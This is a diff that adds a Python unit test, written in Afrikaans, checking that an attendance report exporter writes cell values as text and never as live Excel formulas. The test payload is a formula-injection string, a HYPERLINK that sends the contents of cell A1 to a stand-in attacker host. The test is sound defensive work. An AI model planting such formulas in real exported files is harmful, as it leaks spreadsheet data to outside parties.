@@ -487,3 +487,31 @@ def test_sec017_018_main_gebruik_die_instellings():
     bron = (Path(auth.__file__).parent / "main.py").read_text(encoding="utf-8")
     assert "**http_sekuriteit.dokumentasie_urls()" in bron
     assert 'app.middleware("http")(http_sekuriteit.voeg_sekuriteitsopskrifte_by)' in bron
+
+
+# --- MOON-SEC-010: geen formules in Excel-verslae nie -------------------------
+
+def test_sec010_xlsx_skryf_formule_as_teks():
+    import io
+    from datetime import date, datetime as dt
+    from openpyxl import load_workbook
+    from services.verslag_formate import skryf_xlsx
+    from services.verslag_service import GETAL, TEKS
+
+    kwaad = '=HYPERLINK("http://aanvaller.example/?d="&A1,"Klik")'
+    oorsig = {
+        "titel": "Bywoning",
+        "meta": {"omvang": "Kampus", "van": date(2026, 10, 1), "tot": date(2026, 10, 7), "werksdae": 5,
+                 "gegenereer_op": dt(2026, 10, 12, 9, 0), "gegenereer_deur": "Toets", "rol": "Admin"},
+        "afdelings": [{
+            "titel": "Gaste", "beskrywing": "x", "kernsyfers": [], "insigte": [], "grafieke": [],
+            "tabelle": [{"titel": "Gaste", "totaal": 1,
+                         "kolomme": [{"naam": "Naam", "formaat": TEKS}, {"naam": "Aantal", "formaat": GETAL}],
+                         "rye": [[kwaad, 3]]}],
+        }],
+    }
+    wb = load_workbook(io.BytesIO(skryf_xlsx(oorsig)))
+    selle = [c for ws in wb.worksheets for r in ws.iter_rows() for c in r if c.value == kwaad]
+    assert selle, "die waarde moet steeds sigbaar wees"
+    assert all(c.data_type == "s" for c in selle)
+    assert not any(c.data_type == "f" for ws in wb.worksheets for r in ws.iter_rows() for c in r)
